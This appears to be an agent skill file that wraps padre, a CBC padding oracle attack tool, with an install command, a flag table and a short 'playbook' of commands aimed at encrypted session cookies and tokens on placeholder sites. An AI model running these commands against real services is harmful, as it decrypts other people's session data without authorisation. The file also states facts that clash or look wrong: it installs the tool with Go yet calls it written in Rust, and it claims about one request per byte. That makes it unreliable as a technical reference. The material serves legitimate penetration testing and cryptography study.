---
name: padre-padding-oracle
description: "CBC padding oracle plaintext recovery. Signals: cryptographic attack, encryption cracking, custom error detection, threads, plaintext output."
zh-signals: "padre: CBC 填充预言爆破明文。信号:密码学攻击,加密破解,自定义错误判定,线程,输出明文。"
when-to-use: >-
  Use when you have a CBC-encrypted value and a detectable padding-oracle
  error signal, and want to recover the plaintext byte by byte. Supports
  custom error status codes, thread control, and output files.
---

# padre

- Attack Category: C49 Cryptographic Misuse and Protocol Analysis
- Upstream Repository: https://github.com/glebarez/padre
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
go install github.com/glebarez/padre@latest
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `padre -u 'https://t.com/profile?token=MDEyMzQ1Njc4OQ=='` | Padding oracle attack |
| `-u url -er 200 -or 403` | Custom error detection |
| `-t 20` | Threads |
| `-o out.txt` | Output plaintext |

## Attack Scenario Playbook

### CBC padding oracle plaintext brute force

```bash
padre -u 'https://t.com/login?session=iv+cipher_b64'
# Roughly one request per byte recovers the plaintext of the encrypted cookie
```

## Notes

High-speed padding oracle attack tool written in Rust; automatically detects the error signal and recovers CBC plaintext byte by byte.
